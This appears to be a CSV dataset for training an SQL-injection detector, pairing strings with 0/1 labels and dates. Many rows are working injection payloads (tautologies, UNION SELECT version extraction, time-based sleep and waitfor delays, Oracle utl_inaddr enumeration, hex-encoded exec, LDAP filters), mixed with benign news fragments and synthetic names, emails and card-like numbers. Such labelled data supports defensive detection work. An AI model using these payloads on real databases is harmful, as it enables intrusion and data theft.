Queries,Date
OR SLEEP(5),2016-01-17
select,2016-01-18
And 1=1,2016-01-03
hello my name is,2016-01-14
or' 1=1,2016-01-17
admin,2016-01-17
server,2016-01-06
Where does it come from?,2016-01-25
sections 1.10.32 and 1.10.33,2016-01-21
"injected humour,",2016-01-10
UPDATE,2016-01-27
"a,1",2016-01-18
"a' ,1",2016-01-17
"a' --,1",2016-01-02
"a' or 1 = 1; --,1",2002-05-03
"@,1",2002-05-06
"?,1",2002-05-04
"' and 1 = 0 )  union all,1",2002-05-10
"? or 1 = 1 --,1",2002-05-01
"x' and userid is NULL; --,1",2002-05-05
" However , regard winning run , Rangnick sang team &apos;s praises ,0",2002-05-04
" &quot; There two words it: Really good , &quot; stated ,0",2002-05-04
" There lot criticise ,0",2002-05-08
" Most , manner team playing impressive ,0",2002-05-09
" We must stay composed keep ,0",2002-05-07
" There hardly squad changes winter transfer window ,0",2002-05-10
" There major reason change anything ,0",2002-05-10
" &quot; Unless player comes forward expresses desire leave club , &quot; explained Rangnick ,0",2002-05-09
" Tripodi denies influenced Obeid Former NSW Labor minister Joe Tripodi investigated state &apos;s corruption watchdog ,0",2002-05-06
" Former NSW minister Joe Tripodi denied changing maritime leases policy request political mentor Eddie Obeid , hidden interests three properties government-controlled land ,0",2002-05-07
" The Independent Commission Against Corruption (ICAC) Friday widened inquiry whether Mr Obeid lobbied several state ministers leases Circular Quay , Obeids owned two restaurants cafe , renewed without going tender expiration August 2005 ,0",2002-05-09
" It &apos;s investigating allegations Mr Tripodi knew Mr Obeid &apos;s secret interest properties , evidence given Mr Tripodi &apos;s former deputy chief staff , Lynne Ashpole , Thursday ,0",2002-05-09
" During years discussions starting 2005 government pushing leases go public tender ,0",2002-05-04
" The lessees also wanted longer terms ,0",2002-05-02
" In 2009 leases Circular Quay enterprises , earned Obeids $ 2,0",2002-05-10
"1  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #,1",2002-05-07
"asc,1",2018-08-20
" ( ||6 ) ,1",2018-08-12
"""a"""" or 3 = 3--"",1",2018-08-31
""" or benchmark ( 10000000,MD5 ( 1  )  )  #,1",2018-08-30
"# from wapiti,1",2018-08-13
" or 0 = 0 --,1",2018-08-09
"1 waitfor delay '0:0:10'--,1",2018-08-18
"delete,1",2018-08-21
"like,1",2018-08-21
""" or sleep ( __TIME__ ) #,1",2018-08-15
"pg_sleep ( __TIME__ ) --,1",2018-08-13
"* ( | ( objectclass = *  )  )  ,1",2018-08-14
"declare @q nvarchar  ( 200 )  0x730065006c00650063 ...,1",2018-08-08
" or 0 = 0 #,1",2018-08-17
"insert,1",2018-08-23
"1 )  or sleep ( __TIME__ ) #,1",2018-08-10
" )  or  ( 'a' = 'a,1",2018-08-23
"; exec xp_regread,1",2018-08-16
"*|,1",2018-08-09
"@var select @var as var into temp end --,1",2018-08-03
"illano,0",2008-01-01
"paracuellos de jarama,0",2008-01-01
"56876281h,0",2008-01-01
"marmolejos,0",2008-01-01
"brenda,0",2008-01-01
" select * from users where id = 1 or 1#"". union select 'a',version (  )  -- 1,1",2008-01-01
" select * from users where id = 1 or 1#""; union select null,version (  )  -- 1,1",2008-01-01
" select * from users where id = 1 or 1#""? or 1 = 1 -- 1,1",2008-01-01
"""a"""" or 1 = 1--"",1",2008-01-01
" select * from users where id = 1 *1 union select 1,banner from v$version where rownum = 1 -- 1,1",2008-01-01
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 4  )  )   AND 'i' = 'i,1",2008-01-01
"admin' or ',1",2008-01-01
" select * from users where id = '1' union select  ( \ ) ,@@VERSION -- 1',1",2008-01-01
"1'1,1",2008-01-01
"1 and user_name (  )   =  'dbo',1",2008-01-01
"'; if not ( substring  (  (  select @@version ) ,24,1 )  <> 1 )  waitfor delay '0:0:2' --,1",2008-01-01
" select * from users where id = 1 or 1#""$ union select 1,version (  )  -- 1,1",2008-01-01
" select * from users where id = 1 or 1#""{ union select null,version (  )  -- 1,1",2008-01-01
" select * from users where id = '1' *$ . or 1 = 1 -- 1',1",2008-01-01
" select * from users where id = 1 +$+. or 1 = 1 -- 1,1",2008-01-01
" select * from users where id = 1 or  ( \+ )  = 1 or 1 = 1 -- 1,1",2008-01-01
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 6  )  )   AND 'i' = 'i,1",2008-01-01
" or 1 = 1 or '' = ',1",2008-01-01
" select * from users where id = 1   or 1 = 1 -- 1,1",2008-01-01
" or 'text' > 't',1",2008-01-01
"1234 "" AND 1 = 0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055,1",2008-01-01
" select * from users where id = 1 or ""%["" or 1 = 1 -- 1,1",2008-01-01
"admin"" --,1",2008-01-01
"27113,0",2010-02-27
"7613,0",2010-03-07
"84q42o,0",2010-03-15
"fiset,0",2010-03-15
"glvez matons,0",2010-05-04
"c/ juan ramon jimenez, 135, 11d,0",2010-03-30
"condal talero,0",2010-03-07
"fulmer,0",2010-03-03
"femke,0",2010-03-16
"whorf.laporte@sindualidad.fo,0",2010-05-21
"7016,0",2010-02-17
"waggenheim@rubirubi.info,0",2010-04-27
"shdanoff@esposo.com.tj,0",2010-02-16
"oco,0",2010-02-16
"jabbari,0",2010-02-20
"rodis-ryan@colorprint.info,0",2010-03-02
"lucar planes,0",2010-03-30
"scheifel2,0",2010-05-27
"keaton3,0",2010-02-08
"46177,0",2010-02-25
"05659,0",2010-04-30
"0488545604364372,0",2010-04-29
"arvizu tirapu,0",2010-03-07
"plaza cinco villas, 103,,0",2010-05-20
"24249,0",2010-03-09
"92621448b,0",2010-05-28
"3621942696943868,0",2010-03-26
"trebaol@arroyomolinos-madrid.gq,0",2010-05-25
" select * from users where id = '1' union select !<@,version (  )  -- 1',1",2010-03-04
"declare @q nvarchar  ( 200 )  select @q  =  0x770061 ...,1",2010-04-16
"' or 1 = 1 or '' = ',1",2010-05-12
" select * from users where id = 1 %!<1 or 1 = 1 -- 1,1",2010-02-13
"declare @q nvarchar  ( 200 )  select @q  =  0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec ( @q ) ,1",2010-05-21
"&,1",2010-03-22
"1\'1,1",2010-05-25
" select * from users where id = 1 or ""]1"" or 1 = 1 -- 1,1",2010-05-31
"%2A%28%7C%28objectclass%3D%2A%29%29,1",2010-03-25
" select * from users where id = 1 or $+<1 union select 1,@@VERSION -- 1,1",2010-05-01
" or 'unusual'  =  'unusual',1",2010-04-09
"' or 1 in  ( select @@version ) --,1",2010-02-08
"truncate,1",2010-03-17
"as,1",2010-03-22
" or 3 = 3 --,1",2010-02-20
" select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1,1",2010-05-29
" select * from users where id = 1 <@$$ union select 1,version (  )  -- 1,1",2010-05-09
"admin"" )  or  ( ""1"" = ""1,1",2010-02-04
" select * from users where id = 1 or 1#""@ union select 'a',version (  )  -- 1,1",2010-02-05
